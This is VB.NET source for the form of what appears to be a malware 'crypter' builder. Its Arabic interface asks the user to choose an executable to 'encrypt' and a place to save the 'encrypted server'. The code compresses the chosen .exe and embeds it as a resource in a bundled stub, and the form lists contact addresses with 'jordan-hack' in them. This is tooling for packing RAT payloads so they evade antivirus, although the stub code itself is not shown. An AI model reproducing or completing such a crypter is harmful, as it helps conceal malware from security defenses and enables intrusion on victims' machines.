﻿Public Class Form1

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        MsgBox("alsfa7-jordan-hack@hotmail.com")
        MsgBox("alsfa7-jordan-hack@nimbuzz.com")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim OpenFd As New OpenFileDialog
        With OpenFd
            .Title = "اختر تطبيقا لتشفيره"
            .Filter = "تطبيقات |*.exe"
            .ShowDialog()
        End With
        TextBox1.Text = OpenFd.FileName
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim kbytes() As Byte
        Dim ebytes() As Byte
        Dim SVD As New SaveFileDialog
        With SVD
            .Title = " اختر مكان حفظ السيرفر المشفر"
            .Filter = "تطبيقات |*.exe"
            .ShowDialog()
        End With
        kbytes = IO.File.ReadAllBytes(TextBox1.Text)
        ebytes = Compression.Compress(kbytes)
        IO.File.WriteAllBytes(SVD.FileName, My.Resources.stub)
        WriteResource(SVD.FileName, ebytes)
        MsgBox("تم تشفير السيرفر :p")
    End Sub
End Class
